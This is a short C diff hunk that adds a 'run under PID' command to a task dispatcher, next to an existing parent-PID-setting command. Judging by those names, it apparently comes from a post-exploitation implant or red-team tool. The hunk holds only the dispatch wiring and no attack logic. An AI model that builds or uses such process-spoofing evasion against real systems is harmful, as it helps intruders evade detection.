@@ -83,6 +83,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_PPID:
 			RunSetParentPid(buffer, size);
 			break;
+		case COMMAND_RUN_UNDER_PID:
+			RunUnderPid(buffer, size);
+			break;
 	}
 }
 
